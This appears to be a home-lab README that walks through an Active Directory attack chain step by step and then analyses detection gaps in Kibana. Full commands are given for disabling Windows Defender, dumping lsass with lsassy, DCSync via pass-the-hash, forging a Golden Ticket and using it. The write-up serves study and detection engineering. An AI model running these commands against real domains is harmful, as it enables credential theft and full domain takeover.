# 🔐 Active Directory Home Lab — Phase 4: Persistence via DCSync & Golden Ticket

<div align="center">

![Active Directory](https://img.shields.io/badge/Active%20Directory-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Windows Server](https://img.shields.io/badge/Windows%20Server%202022-0078D4?style=for-the-badge&logo=windows&logoColor=white)
![Elastic](https://img.shields.io/badge/Elastic%20SIEM-005571?style=for-the-badge&logo=elastic&logoColor=white)
![Impacket](https://img.shields.io/badge/Impacket-FF6600?style=for-the-badge&logo=python&logoColor=white)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-FF0000?style=for-the-badge&logo=mitre&logoColor=white)

**Simulating the most dangerous Active Directory attack chain and discovering why a SIEM alone couldn't see it.**

[← Phase 3: Lateral Movement](../Phase-3-Lateral-Movement) · [Phase 5: Detection Engineering →](../Phase5)

</div>

---

## 📌 Lab Series Overview

> This repository is **Phase 4** of a five-phase Active Directory attack and defense home lab built from scratch. Each phase builds progressively to the last — from visibility infrastructure to credential access, enumeration, lateral movement, and finally domain-level persistence. The goal is not just to simulate attacks, but to understand exactly what defenders can and cannot see.

| Phase | Title | Focus |
|-------|-------|-------|
| [Phase 0](../Phase-0-Visibility-Foundation) | Visibility Foundation | ELK Stack, Sysmon, Winlogbeat |
| [Phase 1](../Phase-1-Credential-Access) | Credential Access | LLMNR Poisoning, Kerberoasting, AS-REP Roasting |
| [Phase 2](../Phase-2-Attack-Path-Mapping) | Attack Path Mapping | BloodHound CE, SharpHound, AD Enumeration |
| [Phase 3](../Phase-3-Lateral-Movement) | Lateral Movement | GPO Abuse, NetExec, atexec, SYSTEM Execution |
| **Phase 4** | **Persistence** | **DCSync, Golden Ticket, Detection Gaps** |
| [Phase 5](../Phase5) | Detection Engineering | KQL Queries, Kibana Dashboard, Incident Report |

---

## 1. 🏗️ WHAT DID I BUILD?

In this Phase (Phase 4), I built the final and most dangerous layer of my AD attack simulation — a complete **domain persistence chain** that began with a compromised workstation and ended with forging valid Kerberos authentication tickets using only a cryptographic hash — no passwords, no accounts, no limits.

Specifically, I built and documented:

- A **DCSync attack pipeline** — abusing Active Directory replication rights to extract the `krbtgt` account's NTLM hash and AES256/AES128 keys from the Domain Controller without ever touching disk or logging into the DC interactively
- A **Golden Ticket forge workflow** — using the extracted `krbtgt` AES256 key to mint a completely valid Kerberos TGT entirely offline, then using that ticket to authenticate to the DC and access all 13 domain shares with zero knowledge of any real password
- A **detection hunt in Kibana** — querying for evidence of both attacks across all log sources and mapping exactly what survived, what didn't, and why
- A **documented detection gap analysis** — proving that a well-configured Sysmon + Winlogbeat + ELK pipeline cannot reliably detect either DCSync or Golden Ticket without additional tooling

This phase answers the hardest question in the entire lab series: *"If the worst happens — what would I actually see?"*

---

## 2. 🎯 WHY DID I BUILD IT?

Every previous phase built toward this moment. Credentials were captured in Phase 1. The attack path was mapped in Phase 2. Lateral movement and SYSTEM execution were proven in Phase 3. Phase 4 is where those capabilities converge into something qualitatively different — **domain ownership**.

I built this phase for three specific reasons:

**To understand what "fully compromised" actually means.** Domain Admins get discussed constantly in security. But the real crown jewel isn't a DA account — it's the `krbtgt` hash. Owning `krbtgt` means you can impersonate any identity in the domain, indefinitely, without touching a single account's password. I needed to experience that, not just read about it.

**To test my detection stack under its hardest conditions.** My ELK pipeline performed well in Phases 1–3. DCSync and Golden Ticket were specifically chosen because they are known to be difficult for host-based SIEMs to catch. I wanted to know exactly where my visibility ends — not guess.

**To document the gap honestly.** A lab that only shows you the attacks you can detect is not useful preparation for a real environment. The detection gaps I found in this phase are the most important findings in the entire project.

---

## 3. 🛠️ WHAT TECHNOLOGIES?

### Attack Stack

| Tool | Purpose | Phase Used |
|------|---------|------------|
| **Impacket — secretsdump** | DCSync via Pass-the-Hash | DCSync |
| **Impacket — ticketer** | Golden Ticket forge (offline) | Golden Ticket |
| **Impacket — smbclient** | Authenticate to DC using forged ticket | Ticket use |
| **Impacket — lookupsid** | Enumerate domain SID via RPC | Pre-requisite |
| **NetExec (nxc)** | SMB auth, lsass dump via lsassy module | Credential harvest |
| **lsassy** | In-memory lsass credential extraction | NTLM hash harvest |
| **Kali Linux** | Attacker platform | All |

### Defensive / Detection Stack

| Tool | Purpose |
|------|---------|
| **Elastic SIEM (ELK 8.12)** | Log aggregation, query, and hunt |
| **Winlogbeat 8.12** | Windows Security event shipping |
| **Sysmon (SwiftOnSecurity config)** | Process, network, and access telemetry |
| **Kibana Discover** | KQL-based threat hunting |
| **Windows Defender** | EDR — actively blocked initial lsass dump attempts |

### Lab Infrastructure

| Component | Spec |
|-----------|------|
| Domain Controller | Windows Server 2022 — joshua.local |
| Victim Workstation | Windows 10 — MY-LAB-PC |
| Attacker | Kali Linux 2026 |
| SIEM | Ubuntu 24.04 — ELK Stack via Docker Compose |
| Network | VMware — VMnet2 (192.168.18.0/24) |

---

## 4. ⚙️ HOW DID I BUILD IT?

### Phase 4 Attack Chain — Step by Step

```
j.jenkins (local admin via GPO misconfiguration — Phase 3)
    → Pwn3d! on MY-LAB-PC via NetExec SMB
        → Joshua\Administrator active session found in lsass
            → Defender blocked lsassy and handlekatz
                → Defender disabled (local admin right)
                    → lsassy extracts Administrator NTLM hash
                        → DCSync via Pass-the-Hash
                            → krbtgt NTLM + AES256 keys extracted
                                → Golden Ticket forged (offline)
                                    → Full DC access — zero passwords used
```

---

### Step 1 — Confirming Access & Finding the Target Session

Before any credential extraction, I needed to confirm two things:
that j.jenkins still had Pwn3d! access, and that a Domain Admin
session was live in memory on MY-LAB-PC.

```bash
# Confirm SMB access
netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>'

# Check for active DA sessions
netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>' --loggedon-users
```

**Result:** `Pwn3d!` confirmed. `Joshua\Administrator` shown as active
session (logon_server: JOSHUA-SERVER2022). The DA had an active
session on a workstation — a critical real-world misconfiguration.

> **Network troubleshooting note:** MY-LAB-PC's network profile had
> reverted to `Public` after a reboot, blocking all SMB-In traffic
> despite the Domain profile firewall rules being correct. Fixed by
> setting `NetworkCategory` to `Private` via PowerShell. This is a
> documented real-world gap — firewall rules mean nothing if the
> wrong profile is active.

---

### Step 2 — Bypassing Defender & Dumping NTLM from lsass

Three tools attempted against active Defender:

| Tool | Result | Reason |
|------|--------|--------|
| lsassy | ❌ Blocked at dump | Defender killed the process |
| nanodump | ❌ Architecture mismatch | Wrong binary for this OS build |
| handlekatz | ⚠️ Partial — blocked mid-dump | Defender terminated after copy |

**Defender disabled (local admin privilege required):**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**lsassy re-run — success:**
```bash
netexec smb 192.168.18.142 -u j.jenkins -p '<redacted>' -M lsassy
```

**Output:**
```
LSASSY   Saved 5 Kerberos ticket(s) to /home/kaliadmin/.nxc/modules/lsassy
LSASSY   Joshua\Administrator  203076xxxxxxxxxxxxxxxxxxx
```

> **Key finding:** EDR (Windows Defender) is the primary — and in this
> case only reliable — control against lsass dumping. Local admin
> privileges + EDR bypass are both required. The SIEM saw nothing.

---

### Step 3 — DCSync via Pass-the-Hash

With the Administrator NTLM hash, I performed a DCSync attack —
no plaintext password, no interactive logon to the DC required.

```bash
impacket-secretsdump \
  -just-dc-user krbtgt \
  -hashes :2030xxxxxxxxxxxxxxxxxxxxxxxx \
  joshua.local/Administrator@192.168.18.50
```

**Output:**
```
krbtgt:502:aad3b435b<redacted>:24895xxxxxxxxxxxxxxxxxxx:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b7e5dxxxxxxxxxxxxxxxxxxxxxx
krbtgt:aes128-cts-hmac-sha1-96:af828xxxxxxxxxxxxxxxxxxxxxx
```

**Domain SID retrieved via lookupsid:**
```bash
impacket-lookupsid \
  -hashes :2030 '<redacted>' \
  joshua.local/Administrator@192.168.18.50
```
```
[*] Domain SID is: S-1-5-21-18113xxxxxxxxxxxxxxxxxxx
```

> **Why this matters:** The entire domain's Kerberos trust is now
> in the attacker's hands. Administrator's password is irrelevant.
> It could be changed to 64 random characters and the attack would
> continue unaffected.

---

### Step 4 — Golden Ticket — Three Attempts, Three Lessons

#### Attempt 1 — Fake account (fake_admin) ❌
```bash
impacket-ticketer \
  -nthash 24895<redacted> \
  -domain-sid S-1-5-21-18113xxxxxxxxxxxxxxxxxxx \
  -domain joshua.local fake_admin
```
**Error:** `KDC_ERR_TGT_REVOKED`

**Root cause:** CVE-2021-42287 (November 2021 patch) — Windows
Server 2022 validates PAC account existence against AD. A
non-existent account is rejected immediately. Pre-2021 DCs:
this works perfectly. Most public tutorials still show this flow.

---

#### Attempt 2 — RC4 encryption (NTLM hash only) ❌
Same command using `-nthash` against a real account.

**Error:** `KDC_ERR_TGT_REVOKED`

**Root cause:** Domain enforces AES-only Kerberos policy —
the same finding from the Kerberoasting phase. RC4 tickets
are rejected regardless of account validity.

---

#### Attempt 3 — AES256 key + real account ✅
```bash
impacket-ticketer \
  -aesKey b7e5dxxxxxxxxxxxxxxxxxxx \
  -domain-sid S-1-5-21-1811xxxxxxxxxxxxxxxxxxx \
  -domain joshua.local \
  -duration 10 \
  Administrator
```

**Output:**
```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for joshua.local/Administrator
[*] Signing/Encrypting final ticket
[*] Saving ticket in Administrator.ccache
```

---

### Step 5 — Using the Golden Ticket

```bash
# Load forged ticket into Kerberos environment
export KRB5CCNAME=/home/kaliadmin/Desktop/Administrator.ccache

# Authenticate to DC — zero passwords
impacket-smbclient \
  -k -no-pass \
  -dc-ip 192.168.18.50 \
  joshua.local/Administrator@joshua-server2022.joshua.local
```

**Shares returned:**
```
ACCOUNTING    ADMIN$    C$       CertEnroll    HR
IPC$          IT        MANAGEMENT             NETLOGON
SALES         SharedFolders      SYSVOL        Wallpaper
```

`C$`, `ADMIN$`, and `SYSVOL` confirmed accessible.
Full domain compromise. No password used at any stage after
the initial j.jenkins credential from Phase 1.

---

### Step 6 — Hunting in Kibana

Three queries run against the full log dataset:

**Query 1 — DCSync (4662 with replication GUIDs):**
```kql
event.code: "4662"
AND winlog.event_data.Properties: *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
```
**Result: 0 hits** — DS Access auditing not configured. Silent.

**Query 2 — Golden Ticket TGS request (4769):**
```kql
event.code: "4769"
AND winlog.event_data.TargetUserName: "Administrator"
```
**Result: 0 hits** — Winlogbeat pipeline gap during attack window.
Events existed in Windows Event Log but were never shipped.

**Query 3 — Resulting logon from Kali (4624):**
```kql
event.code: "4624"
AND winlog.event_data.LogonType: "3"
AND source.ip: "192.168.18.70"
```
**Result: 1 hit** — A single, completely normal-looking
Type 3 Kerberos network logon. No red flags. No anomaly score.
Forensically indistinguishable from a legitimate admin logon.

---

## 5. 🔐 WHAT SECURITY CONCEPTS?

### DCSync (MITRE T1003.006)
Any account holding `DS-Replication-Get-Changes-All` rights —
which Domain Admins have by default, can request AD to replicate
directory object secrets as if it were another DC. This means
extracting any account's password hash, including `krbtgt`, without
ever touching `NTDS.dit` on disk or accessing `lsass.exe`.
It looks like normal DC replication traffic from the network layer.

### Golden Ticket (MITRE T1558.001)
The `krbtgt` account's hash is used to sign every TGT issued in
the domain. With that hash, an attacker can forge a TGT for any
account, with any group memberships, for any duration entirely
offline. The resulting ticket is cryptographically valid and accepted
by every DC in the domain. It cannot be invalidated by changing
user passwords. The only remediation is rotating `krbtgt` twice.

### Pass-the-Hash (MITRE T1550.002)
NTLM authentication accepts the password hash directly —
no plaintext password required. An extracted NTLM hash can be
presented as a credential to any service that accepts NTLM auth,
making cracking irrelevant for many attack scenarios.

### CVE-2021-42287 — PAC Validation (November 2021 Patch)
Microsoft's patch to reduce Golden Ticket impact forces the KDC
to verify that the account name in the PAC (Privilege Attribute
Certificate) actually exists in Active Directory. This breaks the
classic "forge a ticket for a non-existent admin" technique on
patched Server 2019/2022. Unpatched DCs remain fully vulnerable.

### Kerberos Encryption Type Enforcement
Domains configured for AES-only Kerberos will reject RC4-encrypted
tickets (`etype 23`). This is a hardening measure that forces
attackers to obtain the AES key rather than just the NTLM hash —
a meaningful uplift in attack difficulty.

### The Detection Gap — Why Host-Based Logging Falls Short

```
Attack Stage          | Logged? | Why
──────────────────────────────────────────────────────────
NTLM Hash Extraction  | ❌ No   | Defender killed, then disabled
DCSync (4662)         | ❌ No   | DS Access audit not configured
Ticket Forge          | ❌ No   | Happened offline on attacker box
TGS Request (4769)    | ❌ No   | Pipeline gap during attack window
Resulting Logon (4624)| ✅ One  | Normal-looking Kerberos logon only
──────────────────────────────────────────────────────────
```

The entire attack left **one artifact** — a normal Kerberos
network logon indistinguishable from legitimate admin activity.
Detection of this attack class requires:
- Microsoft Defender for Identity (MDI)
- Network-layer sensors (Zeek / Suricata)
- Cross-event correlation (4769 with no preceding 4768)

---

## 6. 📚 WHAT DID I LEARN?

### Technical Learnings

**The `krbtgt` hash is categorically different from any other credential.**
Every other credential gives you what that account can access.
The `krbtgt` hash gives you the ability to impersonate anyone in the domain,
with any privilege level, indefinitely. There is no comparison.

**Modern Server 2022 breaks the classic Golden Ticket playbook.**
Two things that "always work" in tutorials failed here:
- Fake accounts rejected (CVE-2021-42287 PAC validation)
- RC4 tickets rejected (AES-only domain policy)

Most public content on Golden Tickets is written against unpatched
environments. The real-world gap between "I read about this" and
"I can do this on a modern patched domain" is significant.

**EDR changes everything about credential dumping.**
With Defender active, three separate lsass dump tools failed.
The attack only succeeded after Defender was manually disabled —
which itself required local admin rights that came from a separate
misconfiguration. The dependency chain matters.

**Logging without auditing is not detection.**
The DC was logging. Winlogbeat was running. ELK was ingesting.
But because Directory Service Access auditing was never enabled,
DCSync produced zero events. The infrastructure was there.
The configuration was not.

**A Winlogbeat registry gap erased the evidence window.**
When Winlogbeat's internal registry file was in a corrupted state,
it shipped no events. The 4769 events from the Golden Ticket use
existed in the Windows Security log — but by the time Winlogbeat
was fixed, the log had rolled over. Retention and pipeline health
are detection dependencies, not just operational ones.

### Operational / Defender Learnings

- Tiered administration is not optional. A DA logging into a workstation
  is what made this entire chain possible.
- Enabling DS Access auditing costs nothing and catches the most
  dangerous attack in this entire lab. It was not enabled.
- Rotating `krbtgt` is the only way to invalidate Golden Tickets —
  and it must be done twice, spaced by the maximum ticket lifetime (10 hrs).
- A single "normal-looking" Kerberos logon is the only survivor of
  a complete domain compromise. Defenders need more than logs to catch this.

---

## 7. 🔄 WHAT WOULD I IMPROVE?

### Detection Improvements

| Gap | Improvement |
|-----|-------------|
| DCSync invisible | Enable Directory Service Access auditing — 4662 with replication GUIDs |
| LSASS dump invisible | Add Sysmon EID 10 ProcessAccess rule targeting lsass.exe |
| Golden Ticket no alert | Build 4769-without-preceding-4768 correlation rule |
| Defender disabled silently | Alert on `DisableRealtimeMonitoring` registry change (Sysmon EID 13) |
| No network-layer detection | Deploy Zeek or Suricata on a SPAN port |
| No MDI | Evaluate Microsoft Defender for Identity for Tier 0 coverage |

### Infrastructure Improvements

- **Static IPs** — DHCP lease changes caused multiple false-start
  troubleshooting sessions. Static assignments on all lab VMs
  would eliminate an entire class of lab friction.
- **Winlogbeat health monitoring** — A Kibana alert on "no events
  from Joshua-Server2022 in last 15 minutes" would have caught
  the pipeline gap immediately instead of discovering it during a hunt.
- **krbtgt rotation procedure** — Document and test the two-rotation
  process as a tabletop exercise. Understand the service impact
  before needing to do it under pressure.
- **Credential Guard** — Enable on all Tier 1/2 systems. Virtualising
  lsass makes the dump technique in this phase impossible outright.

### Lab Scope Improvements

- Add a **Tier 0 / Tier 1 / Tier 2 separation** to make the tiering
  violation (DA session on workstation) a deliberate policy breach
  that triggers a detection rule
- Add **Microsoft Defender for Identity** as a Phase 6 to compare
  its detection of DCSync and Golden Ticket against the ELK pipeline
- Test **krbtgt rotation** and confirm Golden Ticket invalidation
  as an active defensive exercise

---

## 8. 📸 WHAT EVIDENCE DO I HAVE?

### Screenshot 1 — lsassy Extracts Administrator NTLM Hash

> NetExec lsassy module showing successful extraction of
> `Joshua\Administrator` NTLM hash `203072cc67...` after
> Defender real-time protection was disabled.

![lsassy hash extraction](./screenshots/lsassy-administrator-hash.png)
<img width="538" height="318" alt="Administrator NTLM Hash" src="https://github.com/user-attachments/assets/ad0943ee-2780-4385-8491-5aef34192826" />


---

### Screenshot 2 — DCSync Output: krbtgt Extracted

> `impacket-secretsdump` DCSync result showing krbtgt NTLM hash,
> AES256 key, AES128 key, and DES key extracted via Pass-the-Hash.
> No interactive DC logon required.

![DCSync krbtgt output](./screenshots/dcsync-krbtgt-output.png)
<img width="500" height="158" alt="DCSync" src="https://github.com/user-attachments/assets/988bdd79-d0a8-4552-9607-a858c9207b02" />


---

### Screenshot 3 — Domain SID via lookupsid

> `impacket-lookupsid` output showing full domain user and group
> enumeration including Domain SID `S-1-5-21-1811309030-...`
> and all 30+ domain accounts exposed via a single RPC call.

![lookupsid domain enumeration](./screenshots/lookupsid-domain-sid.png)
<img width="468" height="382" alt="Doamin SID" src="https://github.com/user-attachments/assets/9aaa1ba3-8aa4-44d5-88be-c712a7549142" />

---

### Screenshot 4 — Golden Ticket Forged (Administrator.ccache)

> `impacket-ticketer` output showing successful offline ticket
> construction for `joshua.local/Administrator` signed with
> krbtgt AES256 key. No DC interaction required for forgery.

![Golden Ticket forge](./screenshots/golden-ticket-forge.png)
<img width="472" height="262" alt="Golden Ticket Forged" src="https://github.com/user-attachments/assets/a1e8cde2-df29-4a51-be37-b53ca81c234f" />

---

### Screenshot 5 — describeTicket Output: Ticket Verified

> `impacket-describeTicket` parsing `Administrator.ccache` showing:
> `User Name: Administrator`, `Service: krbtgt/JOSHUA.LOCAL`,
> `End Time: 10 hours`, `Flags: forwardable, renewable, initial`.
> A forensically valid TGT.

![describeTicket verified](./screenshots/describe-ticket-output.png)
<img width="538" height="251" alt="Golden DescribeTicket" src="https://github.com/user-attachments/assets/8d7f650c-aa57-4b21-a545-b15412efcd1f" />

---

### Screenshot 6 — Full DC Share Access (No Password)

> `impacket-smbclient` authenticated via forged ticket showing
> all 13 domain shares returned including `C$`, `ADMIN$`,
> `SYSVOL`, `NETLOGON`, and all business shares.
> Authentication: Kerberos only. Password: none.

![DC share access](./screenshots/dc-share-access-golden-ticket.png)
<img width="539" height="376" alt="Full DC Share Access" src="https://github.com/user-attachments/assets/dded24e1-0295-4b42-9506-6574810d2eba" />


---

### Screenshot 7 — Kibana: Zero 4662 Events (DCSync Gap)

> Kibana Discover query `event.code: "4662"` returning zero results
> across the full 1-hour window covering the DCSync attack.
> DS Access auditing not configured — confirmed detection gap.

![DCSync no 4662 events](./screenshots/kibana-no-4662-dcsync.png)
<img width="642" height="659" alt="No event hit 4662" src="https://github.com/user-attachments/assets/e9ae43d1-8bf4-40f6-8aaa-d92431de21b3" />

---

### Screenshot 8 — Kibana: The One Surviving Artifact (4624)

> The single event recovered from the Golden Ticket attack —
> a Type 3 Kerberos network logon from Kali IP `192.168.18.70`
> to `Joshua-Server2022`. Fields visible:
> `AuthenticationPackageName: Kerberos`, `LogonType: 3`,
> `ElevatedToken: %%1842`. No preceding 4768 in the dataset.

![Golden Ticket 4624 survivor](./screenshots/kibana-4624-golden-ticket-logon.png)
<img width="640" height="702" alt="event 4624 kerberos" src="https://github.com/user-attachments/assets/a750ec93-8ac2-4586-8d1a-74c845b2459f" />

---

## 🗺️ Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    PHASE 4 ATTACK CHAIN                         │
└─────────────────────────────────────────────────────────────────┘

[Phase 1] j.jenkins hash captured via Kerberoasting
           Password1! cracked offline
                │
                ▼
[Phase 3] NetExec → MY-LAB-PC → Pwn3d! (GPO misconfiguration)
           j.jenkins in local Administrators via RestrictedGroups GPO
                │
                ▼
[Phase 4] Administrator session found in lsass
           Defender blocks lsassy → Defender disabled (local admin)
           lsassy extracts Administrator NTLM hash
                │
                ▼
          impacket-secretsdump (Pass-the-Hash)
          DCSync against DC → krbtgt NTLM + AES256 extracted
          [ZERO LOG EVIDENCE — DS Access audit not configured]
                │
                ▼
          impacket-ticketer (offline — no DC contact)
          Golden Ticket forged for Administrator
          AES256 signed, 10hr lifetime, real account name
                │
                ▼
          KRB5CCNAME=Administrator.ccache
          impacket-smbclient → DC authenticated
          All 13 shares accessible
          [ONE LOG EVENT — single 4624 Kerberos logon]
                │
                ▼
          ╔═══════════════════════════════╗
          ║   DOMAIN FULLY COMPROMISED    ║
          ║   No passwords used after     ║
          ║   j.jenkins initial cred      ║
          ╚═══════════════════════════════╝
```

---

## 🔗 MITRE ATT&CK Coverage

| Technique | ID | Tool Used |
|-----------|-----|-----------|
| OS Credential Dumping: LSASS Memory | T1003.001 | lsassy |
| OS Credential Dumping: DCSync | T1003.006 | impacket-secretsdump |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | impacket-ticketer |
| Pass the Hash | T1550.002 | impacket-secretsdump |
| Remote Services: SMB/Windows Admin Shares | T1021.002 | impacket-smbclient |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Set-MpPreference |

---

## 📁 Repository Structure

```
Phase4-DCSync-GoldenTicket/
│
├── README.md                        ← This file
├── screenshots/
│   ├── lsassy-administrator-hash.png
│   ├── dcsync-krbtgt-output.png
│   ├── lookupsid-domain-sid.png
│   ├── golden-ticket-forge.png
│   ├── describe-ticket-output.png
│   ├── dc-share-access-golden-ticket.png
│   ├── kibana-no-4662-dcsync.png
│   └── kibana-4624-golden-ticket-logon.png
│
├── detection-notes/
│   ├── T1003.006-dcsync-detection.md
│   └── T1558.001-golden-ticket-detection.md
│
├── kibana-queries/
│   ├── dcsync-hunt.kql
│   ├── golden-ticket-hunt.kql
│   └── logon-from-kali.kql
│
└── configs/
    ├── winlogbeat-dc.yml
    └── krb5.conf
```

---

## ⚠️ Legal & Ethical Notice

> This project was conducted entirely within a private, isolated
> virtual lab environment built and owned by the author.
> No real systems, networks, or accounts were targeted.
> All techniques documented here are for **educational purposes only**.
> Do not replicate any of these techniques against systems
> you do not own or have explicit written permission to test.

---

## 🔗 Connect

**Joshua** | SOC Analyst | Security Engineer | Active Directory | SIEM | Detection Engineering

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/yourprofile)
[![GitHub](https://img.shields.io/badge/GitHub-Portfolio-181717?style=for-the-badge&logo=github)](https://github.com/yourusername)

---

<div align="center">

*Part of the Active Directory Attack & Defense Home Lab Series*

[Phase 0](../Phase0) · [Phase 1](../Phase1) · [Phase 2](../Phase2) · [Phase 3](../Phase3) · **Phase 4** · [Phase 5](../Phase5)

</div>
